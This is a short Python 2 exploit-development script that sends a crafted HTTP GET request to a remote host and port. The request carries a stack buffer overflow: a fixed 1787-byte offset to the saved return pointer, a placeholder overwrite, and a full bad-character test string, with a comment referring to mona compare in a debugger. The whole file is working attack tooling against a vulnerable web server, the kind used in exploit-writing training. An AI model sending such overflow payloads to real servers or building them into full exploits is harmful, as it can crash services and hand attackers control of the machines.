#!/usr/bin/python

import argparse
import sys
import socket

parser = argparse.ArgumentParser("Simple fuzzer for buffer overflow exploits")

parser.add_argument(action='store', dest='rhost', type=str, help='remote host')
parser.add_argument(action='store', type=int, dest='rport', help='remote port')

ap = parser.parse_args()
print("Sending exploit to " + ap.rhost + " " + str(ap.rport))

offset_srp = 1787
buf_len = 2250

# mona compare -a esp -f C:\badchar_test.bin

badchar_test = ""
badchars = [0x00, 0x0A, 0x0D]

for i in range(0x00, 0xFF + 1):
    if i not in badchars:
        badchar_test += chr(i)
with open("badchar_test.bin", "wb") as f:
    f.write(badchar_test)

buf = ''
buf += '\x41' * offset_srp
buf += '\x42' * 4
buf += badchar_test
buf += '\x43' * (buf_len - len(buf))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((ap.rhost, ap.rport))
    s.send("GET " + buf + " HTTP/1.0\r\n\r\n")
    data = s.recv(1024)
    print("Sent buffer length " + str(len(buf)))
    s.close()
except Exception:
    print("sent buffer length " + str(len(buf)))
    sys.exit()
